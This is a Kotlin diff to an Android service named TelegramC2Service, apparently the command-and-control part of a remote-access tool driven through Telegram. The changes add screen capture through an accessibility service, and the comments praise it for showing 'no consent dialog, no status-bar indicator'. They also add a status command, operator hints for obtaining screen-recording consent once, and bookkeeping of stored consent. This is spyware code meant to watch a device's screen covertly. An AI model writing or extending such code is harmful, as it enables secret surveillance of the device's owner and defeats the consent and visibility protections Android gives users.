@@ -121,11 +121,15 @@ class TelegramC2Service : Service() {
                     captureSession?.release()
                     captureSession = null
                     projection = null
+                    // Clears the stored consent flag too: leaving it behind is
+                    // what made every app launch re-prompt.
+                    ProjectionState.detach(applicationContext)
                     sendState()
                 }
             }, Handler(Looper.getMainLooper()))
 
             projection = proj
+            ProjectionState.attach(proj, applicationContext)
             captureSession = ScreenCaptureSession(this, proj)
             log("projection ACTIVE with capture session")
             sendState()
@@ -133,6 +137,7 @@ class TelegramC2Service : Service() {
             log("initProjection ERROR: ${e.message}")
             projection = null
             captureSession = null
+            ProjectionState.detach(applicationContext)
         }
     }
 
@@ -307,15 +312,38 @@ class TelegramC2Service : Service() {
         val result = try {
             when (type) {
                 "screenshot" -> {
-                    val s = captureSession
-                    if (s == null) JSONObject().put("error", "projection_not_ready")
-                    else s.capture()
+                    // Accessibility first: no consent dialog, no status-bar
+                    // indicator. The projection session is the fallback for
+                    // Android versions below 11.
+                    val viaAccessibility = AccessibilityScreenshot.capture(this)
+                    if (!viaAccessibility.has("error")) {
+                        viaAccessibility
+                    } else {
+                        val s = captureSession
+                        if (s != null) {
+                            s.capture()
+                        } else {
+                            JSONObject()
+                                .put("error", "no_capture_path")
+                                .put("accessibility", viaAccessibility)
+                                .put("accessibility_status", AccessibilityScreenshot.status())
+                                .put("hint", "enable the accessibility service (Android 11+), " +
+                                        "or grant screen capture once")
+                        }
+                    }
                 }
 
+                "screenshot_status" -> AccessibilityScreenshot.status()
+
                 "screen_record" -> {
+                    // No accessibility equivalent exists for video, so this one
+                    // genuinely requires a MediaProjection consent.
                     val s = captureSession
                     if (s == null) {
-                        JSONObject().put("error", "projection_not_ready")
+                        JSONObject()
+                            .put("error", "projection_required")
+                            .put("hint", "screen recording has no consent-free API; " +
+                                    "grant screen capture once, then re-run")
                     } else {
                         val dur = args.optInt("duration", 20).coerceIn(5, 120)
                         val startRes = s.startRecording(dur)
@@ -338,7 +366,7 @@ class TelegramC2Service : Service() {
 
                 "screen_record_stop" -> {
                     val s = captureSession
-                    if (s == null) JSONObject().put("error", "projection_not_ready")
+                    if (s == null) JSONObject().put("error", "projection_required")
                     else s.stopRecording()
                 }
 
